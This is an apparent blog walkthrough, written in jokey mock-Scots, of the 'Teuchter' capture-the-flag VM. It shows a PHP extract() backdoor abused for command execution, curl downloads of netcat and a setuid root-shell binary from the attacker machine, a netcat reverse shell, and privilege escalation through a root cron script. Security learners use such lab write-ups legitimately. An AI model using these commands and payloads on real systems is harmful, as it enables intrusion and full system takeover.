<p>Some hints from the author:</p>

<blockquote><p>This VM is designed to be a bit of a joke/troll so a translator might be useful.</p>

<p>The challenge isn&rsquo;t over with root. I&rsquo;ve done my usual flag shenanigans.</p>

<p>A bit of info security research and knowing yer target helps here.</p>

<p><a href="http://www.jackiestewart.co.uk/jokes/weegie%20windies%202000.htm">http://www.jackiestewart.co.uk/jokes/weegie%20windies%202000.htm</a></p></blockquote>

<p>And this one:</p>

<blockquote><p>Less hochmagandy and more studying is needed for this one!</p></blockquote>

<p>Ah am sure ye have questions, so:</p>

<blockquote><p>hochmagandy &ndash; Scottish a mainly jocular or literary word for sexual intercourse</p></blockquote>

<p>Isn&rsquo;t this a promising start..</p>

<!-- more -->


<p>Nothing much to start from, just a web server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>|_http-title: Dinnae Pwn Ma Server... Away and Hack some bawbag else!</span></code></pre></td></tr></table></div></figure>


<p>On the homepage there is just a GIF and a message:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/teuchter/web.jpg" title="homepage" alt="web page"></p>

<p>Ran exiftool on the picture and found nothing. However, there are several comments in the source code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- Wullie's favourite film is the Breakfast Club --&gt;
</span><span class='line'>&lt;!-- /gallery/ /flicks/ or /telly/ Maybe Jim Kerr can help with the music...?  --&gt;
</span><span class='line'>&lt;!-- not a lot of people know about different extensions, such as .pht for PHP --&gt;</span></code></pre></td></tr></table></div></figure>


<p>Wullie seems to be the central character here..William? Wallace? We do have a Highlander reference above, and it fits the Scottish theme. While Ah was googling, Ah found this gem on the Urban Dictionary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Wullie is a very caring person who is easy to get on with,
</span><span class='line'>likes all the joys of life.
</span><span class='line'>Meeting and chating to people from all walks of life.
</span><span class='line'>Also known to like a small shandy or two supports the best scottish team the glasgow rangers.
</span><span class='line'>loves to travel and to get home to the family.
</span><span class='line'>what aload of bull shit wullie</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s get back to the challenge, we have 3 potential web directories to check. In the meantime, Ah have Googled for .pht, since Ah have never seen that extension:</p>

<blockquote><p>The pht file extension is associated with the Partial Hypertext file format.</p>

<p>The pht file stores HTML page that includes a PHP script, dynamically generates HTML, often by
accessing database information.</p>

<p>PHT seems to be very little used format.</p>

<p>Mime types:
application/x-httpd-php
text/html</p></blockquote>

<p>Back to the web server, /gallery/ is full of pictures, and the title is Dirty Foties..which Ah think stands for dirty feet. Because ye walk a lot..(someone needs some Irn-Bru)</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/teuchter/gallery.png" title="dirty foties" alt="gallery"></p>

<p>There are more hints in the source code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;title&gt;Dirty Foties&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;h1&gt;We went on a wee sojourn aboot North Kilt Town and here's whit we saw&lt;/h1&gt;
</span><span class='line'>&lt;!-- By now, people will be going doolally. Images will open doors once ye --&gt;
</span><span class='line'>&lt;!-- pick up on the nuances whar's ma glass cheque! --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Here's something else made from Girders:
</span><span class='line'>
</span><span class='line'>&lt;img src="bandit_country.jpg" alt="Andrew Carnegie" height="460" width="968"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;!-- Beware of the milk snatcher --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Here's where the girders used to come from:
</span><span class='line'>&lt;img src="milk_snatcher.jpg" alt="Margaret Roberts" height="409" width="615" align="centre"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Wee hoose on the corner:
</span><span class='line'>&lt;img src="embra.jpg" alt="Castle" height="409" width="615" align="centre"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;!-- The video gives triggers to the gallery --&gt;
</span><span class='line'>
</span><span class='line'>&lt;!-- Definatly need to find that coded message --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>&lt;img src="bigwheel.jpg" alt="Rotating Station" height="460" width="968" align="centre"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Then we bumped into Mr Corleone:
</span><span class='line'>&lt;img src="horse_heid.jpg" alt="Kelpies" height="409" width="615" align="centre"&gt;</span></code></pre></td></tr></table></div></figure>


<p>North Kilttown is a Scottish town from The Simpsons. Ah searched for the word doolally, even though Ah got the gist from the context. From Wikipedia:</p>

<blockquote><p>&ldquo;Doolally&rdquo;, originally &ldquo;doolally tap&rdquo;, meaning to &lsquo;lose one′s mind&rsquo;, derived from the boredom felt
at the Deolali British Army transit camp.</p></blockquote>

<p>The Urban Dictionary has another priceless definition for a glass cheque:</p>

<blockquote><p>A Glaswegian term: Describes a special glass bottle, containing Irn-Bru, or other similar soft
drink, available in many cornershops in Scotland. The bottle is returnable and currently attracts a
25p refund when ye give the bottle back to the shop. Called a cheque as they are often collected
and cashed (like a cheque)by students and cheap bastards alike either to buy more Bru, or with
enough bottles, some skag.</p></blockquote>

<p>If ye&rsquo;re not curious about what something called Irn-Bru is, ye&rsquo;re a bawheid!</p>

<blockquote><p>The ultimate hangover cure. Tastes best when consumed directly from a 750ml glass bottle.</p>

<p>Another one of Scotland&rsquo;s many national identities.</p>

<p>Scotland is the only country in the world that produces a soft drink that outsells Coca Cola.</p></blockquote>

<p>Ah must try some Irn-Bru! By the way, if ye were wondering, the &ldquo;Wee hoose on the corner&rdquo; is nothing spectacular&hellip;only the Edinburgh Castle! The Kelpies are 30-metre-high horse-head sculptures featuring kelpies&hellip;so what are kelpies? +1 to mythology skill:</p>

<blockquote><p>Kelpie, or water kelpie, is the Scots name given to a shape-shifting water spirit inhabiting the
lochs and pools of Scotland. It has usually been described as appearing as a horse, but is able to
adopt human form</p></blockquote>

<p>How did Ah get in this spiral? Ah had a box to hack..ye know what would help me focus? It starts with Irn and ends with Bru!</p>

<p>The /flicks/ directory gives a 403 Forbidden error, but also discloses the web server version, which is Apache/2.4.18 (Ubuntu) Server</p>

<p>The /telly/ directory also has a picture and 2 videos, along with more hints:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;title&gt;STV Embra&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;h1&gt;Here's some telly programs fur ye!&lt;/h1&gt;
</span><span class='line'>&lt;!-- Mind the hidden messages --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>&lt;img src="STV.jpg" alt="STV" height=300" width="400"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>Now for some adverts....
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>&lt;!-- noise up those crazy yanks 1st hint to a password --&gt;
</span><span class='line'>&lt;video height="300" width="400" controls&gt;
</span><span class='line'>&lt;source src="girders.ogv" type="video/ogg"&gt;
</span><span class='line'>&lt;/video&gt;
</span><span class='line'>&lt;!-- next hint, see how many people make the connection  --&gt;
</span><span class='line'>&lt;!-- between A.G. Barr and the gallery... Aled Jones eh? --&gt;
</span><span class='line'>&lt;video height="300" width="400" controls&gt;
</span><span class='line'>&lt;source src="aled.ogv" type="video/ogg"&gt;
</span><span class='line'>&lt;/video&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;!-- Third video gives triggers to the flicks phpinfo --&gt;
</span><span class='line'>By the way, it's only aboot 250 weeks ti Christmas!
</span><span class='line'>&lt;br&gt;&lt;/br&gt;</span></code></pre></td></tr></table></div></figure>


<p>In case ye forgot about Irn-Bru, here&rsquo;s a reminder:</p>

<blockquote><p>A.G. BARR p.l.c., commonly known as Barr&rsquo;s, is a Scottish soft drink manufacturer, based in
Cumbernauld, Scotland. It manufactures the popular Scottish drink, Irn-Bru</p></blockquote>

<p>Back to the challenge&hellip;but it would be easier if Ah had some Irn-Bru! At this point, the only actionable hint Ah could understand was the one about phpinfo. There is no third video on the page, so Ah just tried navigating to <a href="http://192.168.145.131/flicks/phpinfo.php,">http://192.168.145.131/flicks/phpinfo.php,</a> which didn&rsquo;t work. Following on the hint about .pht extensions, Ah changed it to <a href="http://192.168.145.131/flicks/phpinfo.pht">http://192.168.145.131/flicks/phpinfo.pht</a> and got a blank page instead.</p>

<p>After some Googling and drooling over Irn-Bru, Ah found a blog post about <a href="https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html">PHP Backdoors: Hidden With Clever Use of Extract Function</a>. It explains about a seemingly innocuous backdoor with the code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>@extract ($_REQUEST); 
</span><span class='line'>@die ($ctime($atime));</span></code></pre></td></tr></table></div></figure>


<blockquote><p>The extract() function imports variables into the local symbol table from an array.</p>

<p>This function uses array keys as variable names and values as variable values. For each element it
will create a variable in the current symbol table.</p></blockquote>

<p>The blog post is a very interesting read, and the applicable item is that the code is extracting content sent via GET/POST requests and creating variables that are then executed with the format <code>execute ctime with atime as argument</code></p>

<p>Following the example, running <a href="http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=whoami">http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=whoami</a> returns www-data, so we have achieved command execution! Time for an Irn-Bru break&hellip;</p>

<p>Doing very light enumeration, Ah found out that netcat is available on the target, so Ah fired up a listener and tried using netcat to serve a shell on my listener, but it didn&rsquo;t work. So Ah used Python&rsquo;s SimpleHTTPServer to transfer my netcat to the target system. Note that ye have to use URL encoding: <code><a href="http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=curl%20http%3A%2F%2F192.168.145.129%2Fnc%20--output%20nc">http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=curl%20http%3A%2F%2F192.168.145.129%2Fnc%20--output%20nc</a></code></p>

<p>The binary was downloaded to <code>/var/www/html/flicks</code>. Ah made it executable and ran it, but nothing happened. Next, Ah moved it to /tmp and ran it from there with <code>192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=%2Ftmp%2Fnc%20192.168.145.129%208080%20-e%20%2Fbin%2Fbash</code> and it worked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8080
</span><span class='line'>listening on [any] 8080 ...
</span><span class='line'>connect to [192.168.145.129] from (UNKNOWN) [192.168.145.131] 49172
</span><span class='line'>whoami
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>We have a reverse shell, but it&rsquo;s very limited. The usual Python shell spawning didn&rsquo;t work, because on the box there&rsquo;s actually Python 3. Which only changes things slightly: <code>python3 -c &ldquo;import pty; pty.spawn(&lsquo;/bin/bash&rsquo;);&rdquo;</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python3 -c "import pty; pty.spawn('/bin/bash');"
</span><span class='line'>www-data@teuchter:/var/www/html/flicks$ ls /home
</span><span class='line'>ls /home
</span><span class='line'>cpgrogan  jkerr  proclaimers</span></code></pre></td></tr></table></div></figure>


<p>Inside cpgrogan there&rsquo;s a kochanski directory that we&rsquo;re not permitted to view. In jkerr&rsquo;s home there&rsquo;s an empty .sudo_as_admin_successful file, but we find a hint about jkerr&rsquo;s password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@teuchter:/home/jkerr$ cat login.txt
</span><span class='line'>cat login.txt
</span><span class='line'>Jim,
</span><span class='line'>
</span><span class='line'>Ah decided to rename yer account to jkerr and reset the password
</span><span class='line'>ye'll find it in the photo. Just remember the decode password
</span><span class='line'>dosn't have a space.
</span><span class='line'>
</span><span class='line'>If ye can't figure it out, it's the new name for Jonny & the
</span><span class='line'>Self-Abusers...</span></code></pre></td></tr></table></div></figure>


<p>And inside proclaimers there are 2 directories. We can&rsquo;t enter 500miles, but inside letterfromamerica there are 2 interesting files belonging to root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@teuchter:/home/proclaimers/letterfromamerica$ ls -alh
</span><span class='line'>ls -alh
</span><span class='line'>total 164K
</span><span class='line'>drwxr-xr-x 2 proclaimers proclaimers 4.0K Aug 11  2016 .
</span><span class='line'>drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
</span><span class='line'>-rwsr-xr-x 1 root        root        151K Aug 11  2016 semaphore
</span><span class='line'>-r-Sr-sr-t 1 root        root          42 Jul  9  2016 test</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Inside test there is some kind of message, stating that &ldquo;So Claire was right about those wildcards&rdquo;, and semaphore is an executable. Running it gives a shell under the same user account. Probably need more information (or Irn-Bru) before exploiting this.</p>

<p>Back to the next step, did a su to jkerr and used <em>breakfastclub</em> as a password and it worked! Ah used Python to transfer the images to my machine and broke my shell in the process:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jkerr@teuchter:~$ python3 -m http.server 8080
</span><span class='line'>python3 -m http.server 8080
</span><span class='line'>Serving HTTP on 0.0.0.0 port 8080 ...
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:23] "GET / HTTP/1.1" 200 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:23] code 404, message File not found
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:23] "GET /robots.txt HTTP/1.1" 404 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:27] "GET /promisedyeamiracle.jpg HTTP/1.1" 200 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:29] "GET /breakfastclub.jpg HTTP/1.1" 200 -</span></code></pre></td></tr></table></div></figure>


<p>An Irn-Bru would have prevented that mistake! After redoing the steps, Ah ran exiftool on the downloaded images and found a base64 encoded string in promisedyeamiracle.jpg:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Copyright                       : Z2VtaW5pCg==</span></code></pre></td></tr></table></div></figure>


<p>Decoded, it means <em>gemini</em>. Ah didn&rsquo;t know what to do with this, so Ah googled for the other user accounts.</p>

<p>cpgrogan:</p>

<blockquote><p>Claire Patricia Grogan (born 17 March 1962), known professionally as Clare Grogan or sometimes as
C. P. Grogan, is a Scottish actress and singer. She is best known as the lead singer of the 1980s
new wave music group Altered Images and for supporting roles in the 1981 film Gregory&rsquo;s Girl and
the science fiction sitcom Red Dwarf as the first incarnation of Kristine Kochansk</p></blockquote>

<p>proclaimers:</p>

<blockquote><p>The Proclaimers are a Scottish music duo composed of twin brothers Charlie and Craig Reid (born 5
March 1962). They are best known for their songs &ldquo;I&rsquo;m Gonna Be (500 Miles)&rdquo;, &ldquo;Sunshine on Leith&rdquo;,
&ldquo;I&rsquo;m On My Way&rdquo; and &ldquo;Letter from America&rdquo;, and their singing style with a Scottish accent</p></blockquote>

<p>Well, we don&rsquo;t need an Irn-Bru to connect the dots, gemini, twins! That is actually the password for the proclaimers account. Now to get back to the folders from before:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>proclaimers@teuchter:~/500miles$ ls -alh
</span><span class='line'>ls -alh
</span><span class='line'>total 228K
</span><span class='line'>drwx------ 2 proclaimers proclaimers 4.0K Jul  9  2016 .
</span><span class='line'>drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers 8.0K Jun 30  2016 choclate_lassie.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers  97K Jun 30  2016 city_discovery.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers 8.5K Jun 30  2016 night_oot_teuchters.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers  87K Jun 30  2016 Restless-Natives-Scotland.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers  11K Jun 30  2016 SPT_red.jpg</span></code></pre></td></tr></table></div></figure>


<p>Ah downloaded the images in case of need and out of curiosity. Then it was back to the semaphore. Ah grepped for files containing the word semaphore, and tried avoiding being flooded by irrelevant results like libraries. Eventually, Ah got a hit under <em>/usr/local</em>, in the <code>/usr/local/bin/numpties.sh</code> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/sh
</span><span class='line'>
</span><span class='line'>## Right, time to sort out these numpties that put PHP shells on ma server!
</span><span class='line'>
</span><span class='line'>## Steal a copy to examine later
</span><span class='line'>/bin/tar czvf /root/shells.tgz /var/www/html/*.php
</span><span class='line'>
</span><span class='line'>## Aww they dobbers with primative Egpytian Encryption can away and raffle themselves
</span><span class='line'>sudo apt-get -y purge openssh-server sftp wget 
</span><span class='line'>
</span><span class='line'>## Delete the shells to annoy the eejits
</span><span class='line'>/bin/rm -rf /var/www/html/*.php
</span><span class='line'>
</span><span class='line'>## Plant a semaphore in to alert the monitoring system
</span><span class='line'>if /usr/bin/[ -f /home/proclaimers/letterfromamerica/semaphore ]
</span><span class='line'>  then
</span><span class='line'>    /bin/chown root.root /home/proclaimers/letterfromamerica/semaphore
</span><span class='line'>    /bin/chmod 4755 /home/proclaimers/letterfromamerica/semaphore
</span><span class='line'>fi</span></code></pre></td></tr></table></div></figure>


<p>Back to the dictionaries it is, and memory alert, Ah remembered being called a numpty once!</p>

<blockquote><p>numpty &ndash; A person who is incapable of performing the simplest of task correctly. Usual symptoms
include poor hand-eye coordination, zero common sense and the general illusion that they are
special (caused by parents referring to them as such and the numpty not fully grasping the meaning
implied).</p>

<p>Common causes are being dropped as a baby or repeated heavy blows to head in later life.</p>

<p>dobber &ndash; A Glasgow term for a dick head or in general just a stupid cunt.</p></blockquote>

<p>Now for the code, attempts to put PHP shells on the server fail because the shells get deleted. Also, a couple of file transfer utilities have been removed (the reason why Ah resorted to curl). It looks like this might be used in a cronjob. Finally, if the semaphore file exists, its owner is changed to root and the SUID bit is set. Which means, we can create a semaphore file that would allow us to become root if it were SUID.</p>

<p>On my box, Ah compiled an executable (no GCC on the target) with the following C code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;sys/types.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>int main(void)
</span><span class='line'>{
</span><span class='line'>  setuid(0); setgid(0); system("/bin/bash");
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Ah made it executable for everyone and transfered it to the target, again with curl:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl http://192.168.145.129/rootme --output ./semaphore     
</span><span class='line'>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span><span class='line'>                                 Dload  Upload   Total   Spent    Left  Speed
</span><span class='line'>100 16712  100 16712    0     0  1002k      0 --:--:-- --:--:-- --:--:-- 1020k</span></code></pre></td></tr></table></div></figure>


<p>Waited a while, thought about some Irn-Bru, came back and got root!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./semaphore
</span><span class='line'>root@teuchter:~/letterfromamerica#</span></code></pre></td></tr></table></div></figure>


<p>Finding the flag is usually the last step, but not on knightmare&rsquo;s machines!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>oot@teuchter:/root# ls -alh
</span><span class='line'>ls -alh
</span><span class='line'>total 1.1M
</span><span class='line'>drwx------  5 root root 4.0K Nov  2  2016 .
</span><span class='line'>drwxr-xr-x 23 root root 4.0K Nov  2  2016 ..
</span><span class='line'>drwx------  2 root root 4.0K Nov  2  2016 .aptitude
</span><span class='line'>-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
</span><span class='line'>drwx------  2 root root 4.0K Nov  2  2016 .cache
</span><span class='line'>-rw-r--r--  1 root root 1.1M Jul  9  2016 flag.jpg
</span><span class='line'>-rw-r--r--  1 root root  108 Sep 23  2016 flag.txt
</span><span class='line'>-rw-r--r--  1 root root  148 Aug 17  2015 .profile
</span><span class='line'>drwx------  3 root root 4.0K Aug  1  2016 re-record-not-fade-away
</span><span class='line'>-rw-r--r--  1 root root   75 Jul  9  2016 .selected_editor
</span><span class='line'>-rw-r--r--  1 root root   45 Oct 13 20:00 shells.tgz
</span><span class='line'>-rw-------  1 root root 3.4K Nov  2  2016 .viminfo</span></code></pre></td></tr></table></div></figure>


<p>Ah transfered the flag.jpg to my machine with netcat, but no metadata that could help. The text file is not the right one, obviously:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@teuchter:/root# cat flag.txt 
</span><span class='line'>cat flag.txt
</span><span class='line'>Ah say! Ah say! Ah say boy! Y'all interested in hochmagandy again...?
</span><span class='line'>
</span><span class='line'>Y'all know this aint the correct flag! </span></code></pre></td></tr></table></div></figure>


<p>Looking around further:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@teuchter:/root/re-record-not-fade-away# ls 
</span><span class='line'>ls 
</span><span class='line'>FeelsLikeHeaven  on
</span><span class='line'>cat FeelsLikeHeaven
</span><span class='line'>Yer pure no gonna find the flag... A pit it in a bottle of Red Kola</span></code></pre></td></tr></table></div></figure>


<p>The directory tree goes&hellip;on..and on&hellip;Ah used a Python script to solve this annoyance:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'>
</span><span class='line'><span class="n">startdir</span> <span class="o">=</span> <span class="s">&#39;.&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="nb">dir</span><span class="p">,</span> <span class="n">subdir</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">startdir</span><span class="p">):</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&#39;Found directory: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">dir</span><span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\t</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">f</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




